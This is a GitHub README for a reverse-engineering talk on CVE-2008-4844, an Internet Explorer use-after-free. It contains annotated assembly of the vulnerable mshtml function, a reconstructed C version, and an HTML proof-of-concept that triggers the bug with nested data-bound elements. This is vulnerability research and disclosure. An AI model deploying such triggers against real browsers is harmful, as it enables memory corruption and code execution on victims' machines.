```
          .___                            __  .__
          |   | ____   ____  ____ _______/  |_|__| ____   ____
          |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \
          |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \
          |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/
                                  |__|
                      _______________  ____ ____
                      \_____  \   _  \/_   /_   |
                       /  ____/  /_\  \|   ||   |
                      /       \  \_/   \   ||   |
                      \________\_______/___||___|
                      
```
# Inception 2011
_"Sometimes, the best way to advance is in reverse"_. ([Reversing: Secrest of Reverse Engineering](https://en.wikipedia.org/wiki/Reversing:_Secrets_of_Reverse_Engineering))

Every time any new vulnerability comes out we should be ready to understand it, in order to perform its exploitation or even to build defenses. [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) is one of the most powerful approaches.

Many talks have been done in the last years, as well as too many useless information has been given by security community:
* Some talks have addressed particular frameworks, specific tools and a few libraries.
* No practical demonstration and/or tips and tricks regarding vulnerabilities, leaving the **black magic** hidden to the audience.

This [talk](https://github.com/nbrito/talks/blob/master/2016/ibm-systems/nbrito-inception.pdf) shares some tips and trick learned during real vulnerability reversing process, such as:
* Gathering information about the vulnerability.
* Understand the weakness type.
* Preparing the vulnerable ecosystem.
* Building a toolbox to be used.
* [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) the vulnerability.
* Etc...

It shows, using very detailed [demonstration](https://vimeo.com/nbrito), how to achieve the **state-of-art** building exploitation and defenses, using your own exploitation skills.

The **black magic** is finally unveiled, showing how to use tools (public available) to understand and apply [reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) to a vulnerability.

## Root Cause
### ```CRecordInstance::TransferToDestination``` Assembly Code
```
mov		edi, edi					;; make sure 'edi' will be saved
push	ebp							;; save the value of 'ebp'
mov		ebp, esp					;; 'ebp' points to the top of the stack
push	ecx							;; save the value of 'ecx'
push	ebx							;; save the value of 'ebx'
push	esi							;; save the value of 'esi'
push	edi							;; save the value of 'edi'
mov		edi, ecx					;; 'ecx' is 'Array' pointer
									;;  - pointer is moved to 'edi'
mov		esi, [edi+08h]				;; '[edi+08h]' is the 'Array' size
									;;  - size is moved to 'esi'
xor		ebx, ebx					;; 'ebx' is the 'Counter' for 'do_while' 'Loop'
									;;  - xoring 'ebx' the value will be 0
shr		esi, 02h					;; 'esi' is shifted right 2 bits
									;;  - a good explanation is:
									;;   - 16      = 0Ch = 0000 0000 0001 0000 = 16
									;;   - 16 >> 2 = 04h = 0000 0000 0000 0100 = 4
									;;  - this operation is very similar to:
									;;   - int _arX[x] = { 1, 2, 3, 4, ..., x };
									;;   - int _szX = sizeof(_arX)/sizeof(*_arX);
									;;   - or 'Array.Size()'
									;;   - or 'std::array::size' method
dec		esi							;; IF 'esi' decremented < 0
									;;  - this operation is very similar to:
									;;   - int _arX[x] = { 1, 2, 3, 4, ..., x };
									;;   - int _szX = (sizeof(_arX)/sizeof(*_arX));
                                    ;;   - _szX -= 1;
									;;   - or 'Array.Size() - 1'
									;;  - 'esi' is the 'Array Index'
mov		dword ptr [ebp-04h], ebx	;; 'ebx' as the '[ebp-04h]'
js		return						;; THEN 'return'
									;; ELSE
do_while:							;; 'do_while'
									;;  - there is more to do
mov		eax, [edi+0Ch]				;; '[edi+0Ch]' is the 'Array Elements' pointer
									;;  - pointer is moved to 'eax'
cmp		dword ptr [eax+ebx*04h], 0	;; IF 'Array Element' == 0
									;;  - a good explanation is:
									;;	 - each 'Loop' increments 'Counter'
									;;    - #1: 'ebx' is 0 and 'eax' is 12345678h
									;;     - 'Array Element' is (12345678h+(0*4))
									;;     - or 1234567Ch
									;;    - #2: 'ebx' is 1 and 'eax' is 12345678h
									;;     - 'Array Element' is (12345678h+(1*4))
									;;     - or 12345680h
je		continue					;; THEN 'continue'
									;; ELSE
mov		ecx, [eax+ebx*04h]			;; '[eax+ebx*04h]' is the 'Array Element' pointer
									;;  - pointer is moved to 'ecx'
call	TransferFromSrc@CXfer		;; call 'CXfer::TransferFromSrc()'
test	eax, eax					;; IF 'eax' == 0
									;;  - 'eax' modified by 'CXfer::TransferFromSrc()'
je		continue					;; THEN 'continue'
									;; ELSE
cmp		dword ptr [ebp-04h], 0		;; IF '[ebp-04h]' != 0
									;;  - '[ebp-04h]' already has 0
									;;  - 'mov dword ptr [ebp-04h], ebx'
									;;  - a good explanation is:
									;;	 - each 'Loop' increments 'Counter'
									;;    - #1: '[ebp-04h]' is 0
									;;     - THEN 'continue'
									;;    - #2: '[ebp-04h]' is 1
									;;     - ELSE 'mov dword ptr [ebp-04h], eax'
									;;   - 0 seens to be OK and anything else NOT OK
jne		continue					;; THEN 'continue'
									;; ELSE
mov		dword ptr [ebp-04h], eax	;; 'eax' as the '[ebp-04h]'
continue:							;; 'continue'
									;;  - whether there is nothing or more to do
inc		ebx							;; increment the 'Counter'
cmp		ebx, esi					;; IF 'Counter' <= 'Array Index'
									;;  - a good explanation for MS08-078 is:
									;;   - since the 'Array' has been freed
									;;   - the 'Array Elements' have been destroyed
									;;   - the '[edi+08h]' has been updated
									;;   - but 'Array Index' (esi) hasn't been
jle		do_while					;; THEN 'do_while'
									;; ELSE
return:								;; 'return'
									;;  - there is nothing to do
mov		eax, dword ptr [ebp-04h]	;; 'eax' points to the '[ebp-04h]'
pop		edi							;; 'edi' is 'Array' pointer
pop		esi							;; 'esi' is 'Array Index'
pop		ebx							;; 'ebx' is 'Counter' or 'Array Elements'
leave								;; destroy current stack frame
									;;  - restore the previous frame
ret									;; guess what? ;)

```
###  ```CRecordInstance::TransferToDestination``` Reverse Engineered Code
```
int CRecordInstance::TransferToDestination () {
    int ebp_minus_4h, eax;
    int esi, ebx = 0;
    
    esi = (sizeof(edi) >> 2) - 1;

    ebp_minus_4h = ebx;
    
    do{
        if(edi[ebx] == 0) continue;

        eax = edi[ebx]->TransferFromSrc();

        if((ebp_minus_4h == 0) && (eax != 0))
            ebp_minus_4h = eax;

        ebx++;
    }while(ebx <= esi);

    return(ebp_minus_4h);
}
````
## [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) Description
After three years, the CVE Editorial Board has decided to change the description for [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) based on this research. As a direct result, the [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) is much more accurate than before. Check by yourself...

### Previous
_Use-after-free vulnerability in mshtml.dll in Microsoft Internet Explorer 5.01, 6, and 7 on Windows XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, and Server 2008 allows remote attackers to execute arbitrary code via a crafted XML document containing nested SPAN elements, as exploited in the wild in December 2008._

### Current
_Use-after-free vulnerability in the ```CRecordInstance::TransferToDestination``` function in mshtml.dll in Microsoft Internet Explorer 5.01, 6, 6 SP1, and 7 allows remote attackers to execute arbitrary code via DSO bindings involving (1) an XML Island, (2) XML DSOs, or (3) Tabular Data Control (TDC) in a crafted HTML or XML document, as demonstrated by nested ```SPAN``` or ```MARQUEE``` elements, and exploited in the wild in December 2008._

### Lacking Further Information
Even with this update, the [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) description still lacks further information, because nested ```DIV```, ```LABEL```, ```LEGEND```, ```MARQUEE``` and ```SPAN``` elements can also be used to reprocude the vulnerability, and they doesn not even need to be the same, they can be mixed. Example:
```
<HTML>
<SCRIPT LANGUAGE="JavaScript">
function Inception (){
	document.getElementById("b00m").innerHTML =
		"<XML ID=I>" +
		"<X>" +
		"<C>" +
		"&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;" +
		"</C>" +
		"</X>" +
		"</XML>" +
		"<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"<DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"</DIV>" +
		"</SPAN>";
}
</SCRIPT>
<BODY onLoad="Inception();">
<DIV ID="b00m" STYLE="display: none;">
</DIV>
</BODY>
</HTML>
```
For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/pop/html/ips-bypass-test-bed).

## Credits
[Nelson Brito](https://fnstenv.blogspot.com) (a.k.a. repository's owner)

## Disclaimer
Codes are available for research purposes only, and the repository's owner vehemently denies the malicious use, as well as the illegal purpose use, of any information, code and/or tool contained in this repository.

If you think there is any information, code and/or tool that sould not be here, please, contact the repository's owner.

## Warning
This repository does not provide you with any legal rights to any intellectual property in any information, code and/or tool, also, be aware that the use of some information, code and/or tool may be forbidden in some countries, and there may be rules and laws prohibiting any unauthorized user from use the information, code and/or tool, being these actions considered illegal.
